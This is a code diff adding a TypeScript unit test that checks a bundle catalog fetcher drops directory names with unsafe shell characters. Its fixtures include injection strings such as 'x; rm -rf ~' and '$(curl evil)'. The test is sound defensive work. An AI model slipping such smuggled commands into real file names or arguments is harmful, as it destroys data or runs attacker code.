@@ -96,4 +96,20 @@ describe("fetchBundleCatalog", () => {
     const fetchImpl = async () => okResponse(contentsJson([{ name: "README.md", type: "file" }]));
     expect(await fetchBundleCatalog(fetchImpl as unknown as typeof fetch)).toEqual(FALLBACK_BUNDLES);
   });
+
+  it("drops ids with unsafe characters — a dir name is never trusted as a shell token", async () => {
+    // A compromised/forked repo could name a bundle dir with shell metacharacters; the id ends up
+    // in an auto-run terminal command, so anything outside the safe slug charset must be excluded.
+    const fetchImpl = async () =>
+      okResponse(
+        contentsJson([
+          { name: "manual-qa", type: "dir" }, // safe → kept
+          { name: "x; rm -rf ~", type: "dir" }, // injection → dropped
+          { name: "$(curl evil)", type: "dir" }, // injection → dropped
+          { name: "Feature_Dev", type: "dir" }, // underscores/caps → dropped
+        ]),
+      );
+    const catalog = await fetchBundleCatalog(fetchImpl as unknown as typeof fetch);
+    expect(catalog.map((b) => b.id)).toEqual(["manual-qa"]);
+  });
 });
